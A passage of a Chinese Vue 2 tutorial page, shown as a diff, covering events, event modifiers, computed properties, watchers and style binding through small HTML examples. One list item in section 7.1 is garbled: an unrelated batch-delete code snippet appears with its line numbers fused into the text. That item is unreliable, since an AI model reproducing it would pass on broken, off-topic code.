+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;3.Vue中的数据代理&lt;/title&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h1&gt;学校名称：{{name}}&lt;/h1&gt;
+      &lt;h1&gt;学校地址：{{address}}&lt;/h1&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      const vm = new Vue({
+         el: '#root',
+         data: {
+            name: '韶关学院123',
+            address: '韶关'
+         }
+      })
+      console.log(vm)
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="_4">七、事件处理</h1>
+<h2 id="71">7.1 事件的基本使用</h2>
+<p>事件的基本使用：</p>
+<ol>
+<li>
+<p>使用v-on:XXX或@xxx 绑定事件，其中xxx是事件名</p>
+</li>
+<li>
+<p>xxxxxxxxxx33 1// 当多选选项发生变化的时候调用2handleSelectionChange(selection) {3  console.log(selection)4  this.multipleSelection = selection5},6// 批量删除7batchRemove() {8  if (this.multipleSelection.length === 0) {9    this.$message.warning('请选择要删除的记录！')10    return11  }12  this.$confirm('此操作将永久删除该记录, 是否继续?', '提示', {13    confirmButtonText: '确定',14    cancelButtonText: '取消',15    type: 'warning'16  }).then(() =&gt; {17    // 点击确定，远程调用ajax18    // 遍历selection，将id取出放入id列表19    var idList = []20    this.multipleSelection.forEach(item =&gt; {21      idList.push(item.id)22    })23    // 调用api24    return api.batchRemove(idList)25  }).then((response) =&gt; {26    this.fetchData()27    this.$message.success(response.message)28  }).catch(error =&gt; {29    if (error === 'cancel') {30      this.$message.info('取消删除')31    }32  })33}js</p>
+</li>
+<li>methods中配置的函数，不要使用箭头函数！否则this就不是vm了</li>
+<li>methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象</li>
+<li>@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参</li>
+</ol>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;2.事件修饰符&lt;/title&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;style&gt;
+      * {
+         margin-top: 20px;
+      }
+
+      .demo1 {
+         height: 60px;
+         background-color: skyblue;
+      }
+
+      .box1 {
+         padding: 10px;
+         background-color: skyblue;
+      }
+
+      .box2 {
+         padding: 10px;
+         background-color: orange;
+      }
+
+      .list {
+         width: 200px;
+         height: 200px;
+         background-color: peru;
+         overflow: auto;
+      }
+
+      li {
+         height: 100px;
+      }
+   &lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h2&gt;欢迎来到{{name}}&lt;/h2&gt;
+      &lt;!-- 阻止默认事件（常用） --&gt;
+      &lt;a href=&quot;http://www.xgzx.net.cn&quot; @click.prevent=&quot;showInfo&quot;&gt;点我提示信息&lt;/a&gt;
+      &lt;!-- 阻止事件冒泡（常用） --&gt;
+      &lt;div class=&quot;demo1&quot; @click=&quot;showInfo&quot;&gt;
+         &lt;button @click.stop=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;
+         &lt;!-- 修饰符可以连续写 --&gt;
+         &lt;!-- &lt;a href=&quot;http://www.xgzx.net.cn&quot; @click.stop.prevent=&quot;showInfo&quot;&gt;点我提示信息&lt;/a&gt; --&gt;
+      &lt;/div&gt;
+
+      &lt;!-- 事件只触发一次（常用） --&gt;
+      &lt;button @click.once=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;
+
+      &lt;!-- 使用事件的捕获模式 --&gt;
+      &lt;div class=&quot;box1&quot; @click.capture=&quot;showMsg(1)&quot;&gt;
+         div1
+         &lt;div class=&quot;box2&quot; @click=&quot;showMsg(2)&quot;&gt;
+            div2
+         &lt;/div&gt;
+      &lt;/div&gt;
+
+      &lt;!-- 只有event.target是当前操作的元素时才触发事件--&gt;
+      &lt;div class=&quot;demo1&quot; @click.self=&quot;showInfo&quot;&gt;
+         &lt;button @click=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;
+      &lt;/div&gt;
+
+      &lt;!-- 事件的默认行为立即执行，无需等待事件回调执行完毕 --&gt;
+      &lt;ul @wheel.passive=&quot;demo&quot; class=&quot;list&quot;&gt;
+         &lt;li&gt;1&lt;/li&gt;
+         &lt;li&gt;2&lt;/li&gt;
+         &lt;li&gt;3&lt;/li&gt;
+         &lt;li&gt;4&lt;/li&gt;
+      &lt;/ul&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      const vm = new Vue({
+         el: '#root',
+         data: {
+            name: 'xgzx',
+         },
+         methods: {
+            showInfo(e) {
+               // e.preventDefault()
+               // e.stopPropagation();
+               alert('你好')
+               // console.log(e.target)
+            },
+            showMsg(value) {
+               console.log(value)
+            },
+            demo() {
+               for (let i = 0; i &lt; 1000000; i++) {
+                  console.log('#')
+               }
+               console.log('累死了')
+            }
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="72">7.2 事件修饰符</h2>
+<p><img alt="image-20221128220338384" src="../assets/image-20221128220338384.png" /></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;2.事件修饰符&lt;/title&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;style&gt;
+      * {
+         margin-top: 20px;
+      }
+
+      .demo1 {
+         height: 60px;
+         background-color: skyblue;
+      }
+
+      .box1 {
+         padding: 10px;
+         background-color: skyblue;
+      }
+
+      .box2 {
+         padding: 10px;
+         background-color: orange;
+      }
+
+      .list {
+         width: 200px;
+         height: 200px;
+         background-color: peru;
+         overflow: auto;
+      }
+
+      li {
+         height: 100px;
+      }
+   &lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h2&gt;欢迎来到{{name}}&lt;/h2&gt;
+      &lt;!-- 阻止默认事件（常用） --&gt;
+      &lt;a href=&quot;http://www.xgzx.net.cn&quot; @click.prevent=&quot;showInfo&quot;&gt;点我提示信息&lt;/a&gt;
+      &lt;!-- 阻止事件冒泡（常用） --&gt;
+      &lt;div class=&quot;demo1&quot; @click=&quot;showInfo&quot;&gt;
+         &lt;button @click.stop=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;
+      &lt;/div&gt;
+
+      &lt;!-- 事件只触发一次（常用） --&gt;
+      &lt;button @click.once=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;
+
+      &lt;!-- 使用事件的捕获模式 --&gt;
+      &lt;div class=&quot;box1&quot; @click.capture=&quot;showMsg(1)&quot;&gt;
+         div1
+         &lt;div class=&quot;box2&quot; @click=&quot;showMsg(2)&quot;&gt;
+            div2
+         &lt;/div&gt;
+      &lt;/div&gt;
+
+      &lt;!-- 只有event.target是当前操作的元素时才触发事件--&gt;
+      &lt;div class=&quot;demo1&quot; @click.self=&quot;showInfo&quot;&gt;
+         &lt;button @click=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;
+      &lt;/div&gt;
+
+      &lt;!-- 事件的默认行为立即执行，无需等待事件回调执行完毕 --&gt;
+      &lt;ul @wheel.passive=&quot;demo&quot; class=&quot;list&quot;&gt;
+         &lt;li&gt;1&lt;/li&gt;
+         &lt;li&gt;2&lt;/li&gt;
+         &lt;li&gt;3&lt;/li&gt;
+         &lt;li&gt;4&lt;/li&gt;
+      &lt;/ul&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      const vm = new Vue({
+         el: '#root',
+         data: {
+            name: 'xgzx',
+         },
+         methods: {
+            showInfo(e) {
+               // e.preventDefault()
+               // e.stopPropagation();
+               alert('你好')
+               // console.log(e.target)
+            },
+            showMsg(value) {
+               console.log(value)
+            },
+            demo() {
+               for (let i = 0; i &lt; 1000000; i++) {
+                  console.log('#')
+               }
+               console.log('累死了')
+            }
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="73">7.3 键盘事件</h2>
+<p><img alt="image-20221128222237564" src="../assets/image-20221128222237564.png" /></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;键盘事件&lt;/title&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h2&gt;欢迎来到{{name}}&lt;/h2&gt;
+      &lt;input type=&quot;text&quot; placeholder=&quot;按下回车提示输入&quot; @keyup.enter=&quot;showInfo&quot;&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+      /* Vue.config.keyCodes = {
+         &quot;huiche&quot;: 13,  //定义了一个别名按键
+      }; */
+
+      const vm = new Vue({
+         el: '#root',
+         data: {
+            name: 'xgzx',
+         },
+         methods: {
+            showInfo(e) {
+               // if(e.keyCode != 13)  return;
+               console.log(e.target.value)
+               // console.log(e.key, e.keyCode)
+            }
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="_5">八、计算属性</h1>
+<h2 id="81-_">8.1 姓名案例_插值语法实现</h2>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;1.姓名案例_插值语法实现&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt;&lt;br&gt;
+      名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt;&lt;br&gt;
+      全名：&lt;span&gt;{{firstName}}-{{lastName}}&lt;/span&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      const vm = new Vue({
+         el: '#root',
+         data: {
+            firstName: '张',
+            lastName: '三'
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="82-_methods">8.2 姓名案例_methods实现</h2>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;2.姓名案例_methods实现&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt;&lt;br&gt;
+      名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt;&lt;br&gt;
+      全名：&lt;span&gt;{{fullName()}}&lt;/span&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      const vm = new Vue({
+         el: '#root',
+         data: {
+            firstName: '张',
+            lastName: '三'
+         },
+         methods: {
+            fullName() {
+               return this.firstName + '-' + this.lastName
+            }
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="83-_">8.3 姓名案例_计算属性实现</h2>
+<p>计算属性：</p>
+<ol>
+<li>定义：要用的属性不存在，要通过已有属性计算得来</li>
+<li>原理：底层借助了Object.defineproperty方法提供的setter和getter</li>
+<li>get函数什么时候执行？<ul>
+<li>初次读取时会执行一次</li>
+<li>当依赖的数据发生改变会被再次调用</li>
+</ul>
+</li>
+<li>优势：与methods实现相比，内部又缓存机制（复用），效率更高，调试方便</li>
+<li>备注；<ul>
+<li>计算属性最终会出现在vm上，直接读取使用即可</li>
+<li>如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变</li>
+</ul>
+</li>
+</ol>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;4.姓名案例_计算属性实现(简写)&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt;&lt;br&gt;
+      名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt;&lt;br&gt;
+      全名：&lt;span&gt;{{fullName}}&lt;/span&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      const vm = new Vue({
+         el: '#root',
+         data: {
+            firstName: '张',
+            lastName: '三'
+         },
+         computed: {
+            // 完整写法
+            /* fullName: {
+               get() {
+                  return this.firstName + '-' + this.lastName
+               },
+               set(value) {
+                  const arr = value.split('-');
+                  this.firstName = arr[0];
+                  this.lastName = arr[1];
+               }
+            } */
+            // 简写（确定不需要修改的时候）
+            fullName() {
+               return this.firstName + '-' + this.lastName
+            }
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="_6">九、监视属性</h1>
+<h2 id="91">9.1 天气案例</h2>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;天气案例&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h2&gt;今天天气很{{info}}&lt;/h2&gt;
+      &lt;button @click=&quot;changeWeather&quot;&gt;切换天气&lt;/button&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      new Vue({
+         el: '#root',
+         data: {
+            isHot: true,
+         },
+         computed: {
+            info() {
+               return this.isHot ? '炎热' : '凉爽'
+            }
+         },
+         methods: {
+            changeWeather() {
+               this.isHot = !this.isHot
+            }
+         },
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="92-_">9.2 天气案例_监视属性</h2>
+<p><img alt="image-20221130134949952" src="../assets/image-20221130134949952.png" /></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;天气案例_监视属性&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h2&gt;今天天气很{{info}}&lt;/h2&gt;
+      &lt;button @click=&quot;changeWeather&quot;&gt;切换天气&lt;/button&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      const vm = new Vue({
+         el: '#root',
+         data: {
+            isHot: true,
+         },
+         computed: {
+            info() {
+               return this.isHot ? '炎热' : '凉爽'
+            }
+         },
+         methods: {
+            changeWeather() {
+               this.isHot = !this.isHot
+            }
+         },
+         /* watch: {
+            isHot: {
+               immediate: true,   //初始化时让handler调用一下
+               // 当isHot发生改变事调用Handler
+               handler(newValue, oldValue) {
+                  console.log('info被修改', newValue, oldValue);
+               }
+            }
+         } */
+      })
+
+      vm.$watch('isHot', {
+         immediate: true,
+         handler(newValue, oldValue) {
+            console.log('info被修改', newValue, oldValue);
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="93-_">9.3 天气案例_深度监视</h2>
+<p><img alt="image-20221130140228845" src="../assets/image-20221130140228845.png" /></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;天气案例_深度监视&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h2&gt;今天天气很{{info}}&lt;/h2&gt;
+      &lt;button @click=&quot;changeWeather&quot;&gt;切换天气&lt;/button&gt;
+      &lt;br&gt;
+      &lt;h2&gt;a的值是：{{numbers.a}}&lt;/h2&gt;
+      &lt;button @click=&quot;numbers.a++&quot;&gt;点我让a++&lt;/button&gt;
+      &lt;h2&gt;b的值是：{{numbers.b}}&lt;/h2&gt;
+      &lt;button @click=&quot;numbers.b++&quot;&gt;点我让b++&lt;/button&gt;
+      &lt;button @click=&quot;numbers = {a:666,b:888}&quot;&gt;点我彻底让numbers改变&lt;/button&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      const vm = new Vue({
+         el: '#root',
+         data: {
+            isHot: true,
+            numbers: {
+               a: 1,
+               b: 1
+            }
+         },
+         computed: {
+            info() {
+               return this.isHot ? '炎热' : '凉爽'
+            }
+         },
+         methods: {
+            changeWeather() {
+               this.isHot = !this.isHot
+            }
+         },
+         watch: {
+            isHot: {
+               handler(newValue, oldValue) {
+                  console.log('info被修改', newValue, oldValue);
+               }
+            },
+            // 监视多级结构中某个属性的变化
+            // 'numbers.a': {
+            //    handler() {
+            //       console.log('a被改变')
+            //    }
+            // }
+            // 监视多级结构中所有属性的变化
+            numbers: {
+               deep:true,
+               handler() {
+                  console.log('numbers被改变')
+               }
+            }
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="94-__">9.4 天气案例_深度监视_简写</h2>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;天气案例_深度监视_简写&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h2&gt;今天天气很{{info}}&lt;/h2&gt;
+      &lt;button @click=&quot;changeWeather&quot;&gt;切换天气&lt;/button&gt;
+      &lt;br&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      const vm = new Vue({
+         el: '#root',
+         data: {
+            isHot: true,
+         },
+         computed: {
+            info() {
+               return this.isHot ? '炎热' : '凉爽'
+            }
+         },
+         methods: {
+            changeWeather() {
+               this.isHot = !this.isHot
+            }
+         },
+         watch: {
+            // 正常写法
+            // isHot: { 
+            //    // immediate:true,   //初始化时，让handler调用一下
+            //    // deep:true,  //深度监视
+            //    handler(newValue, oldValue) {
+            //       console.log('isHot被修改', newValue, oldValue);
+            //    }
+            // },
+
+            // 简写
+            // isHot(newValue, oldValue) {
+            //    console.log('isHot被修改', newValue, oldValue);
+            // }
+         }
+      })
+      // 正常写法
+      // vm.$watch('isHot', {
+      //    immediate: true,   //初始化时，让handler调用一下
+      //    deep: true,  //深度监视
+      //    handler(newValue, oldValue) {
+      //       console.log('isHot被修改', newValue, oldValue);
+      //    }
+      // })
+
+      // 简写
+      vm.$watch('isHot', function (newValue, oldValue) {
+         console.log('isHot被修改', newValue, oldValue);
+      });
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="95-watchcomputed">9.5 watch和computed的区别</h2>
+<p><img alt="image-20221130142831567" src="../assets/image-20221130142831567.png" /></p>
+<p>姓名案例_watch实现</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;姓名案例_watch实现&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt;&lt;br&gt;
+      名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt;&lt;br&gt;
+      全名：&lt;span&gt;{{fullName}}&lt;/span&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      const vm = new Vue({
+         el: '#root',
+         data: {
+            firstName: '张',
+            lastName: '三',
+            fullName: '张-三'
+         },
+         watch: {
+            firstName(val) {
+               this.fullName = val + '-' + this.lastName;
+            },
+            lastName(val) {
+               this.fullName = this.firstName + '-' + val;
+            }
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<p>姓名案例_计算属性实现</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;4.姓名案例_计算属性实现(简写)&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt;&lt;br&gt;
+      名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt;&lt;br&gt;
+      全名：&lt;span&gt;{{fullName}}&lt;/span&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      const vm = new Vue({
+         el: '#root',
+         data: {
+            firstName: '张',
+            lastName: '三'
+         },
+         computed: {
+            fullName() {
+               return this.firstName + '-' + this.lastName
+            }
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="_7">十、绑定样式</h1>
+<p>绑定样式:
+1. class样式</p>
+<pre><code>写法:class="xxx"xXx可以是字符串、对象、数组。
+字符串写法适用于：类名不确定，要动态获取。
+对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
+数组写法适用于：要绑定多个样式，个数不确定，名字也不确定
+</code></pre>
+<ol>
+<li>style样式</li>
+</ol>
+<p>​ :style="{fontSize：xxx}"其中xxx是动态值。
+  ​ : style="[a,b]"其中a、b是样式对象</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;绑定样式&lt;/title&gt;
+   &lt;style&gt;
+      .basic {
+         width: 400px;
+         height: 100px;
+         border: 1px solid black;
+      }
+
+      .happy {
+         background-color: aliceblue;
+      }
+
+      .sad {
+         background-color: yellowgreen;
+      }
+
+      .normal {
+         background-color: blue;
+      }
+
+      .abc1 {
+         background-color: violet;
+      }
+
+      .abc2 {
+         background-color: aqua;
+      }
+
+      .abc3 {
+         background-color: brown;
+      }
+   &lt;/style&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 --&gt;
+      &lt;div class=&quot;basic&quot; :class=&quot;mood&quot; @click=&quot;changeMood&quot;&gt;{{name}}&lt;/div&gt;&lt;br&gt;&lt;br&gt;
+
+      &lt;!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 --&gt;
+      &lt;div class=&quot;basic&quot; :class=&quot;classArr&quot; @click=&quot;changeMood&quot;&gt;{{name}}&lt;/div&gt;&lt;br&gt;&lt;br&gt;
+
+      &lt;!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 --&gt;
+      &lt;div class=&quot;basic&quot; :class=&quot;classObj&quot;&gt;{{name}}&lt;/div&gt;&lt;br&gt;&lt;br&gt;
+
+      &lt;!-- 绑定style样式--对象写法 --&gt;
+      &lt;div class=&quot;basic&quot; :style=&quot;styleObj&quot;&gt;{{name}}&lt;/div&gt;&lt;br&gt;&lt;br&gt;
+      &lt;!-- 绑定style样式--数组写法 --&gt;
+      &lt;div class=&quot;basic&quot; :style=&quot;[styleObj,styleObj2]&quot;&gt;{{name}}&lt;/div&gt;
+   &lt;/div&gt;
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      // 阻止 vue 在启动时生成生产提示
+      Vue.config.productionTip = false;
+
+      new Vue({
+         el: '#root',
+         data: {
+            name: 'xgzx',
+            mood: 'normal',
+            classArr: ['abc1', 'abc2', 'abc3'],
+            classObj: {
+               abc1: false,
+               abc2: false
+            },
+            styleObj: {
+               fontSize: '40px',
+               color: 'red',
+            },
+            styleObj2: {
+               backgroundColor: 'orange'
+            }
+         },
+         methods: {
+            changeMood() {
+               const arr = ['happy', 'sad', 'normal'];
+               this.mood = arr[Math.floor(Math.random() * 3)];
+            }
+         },
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="_8">十一、条件渲染</h1>
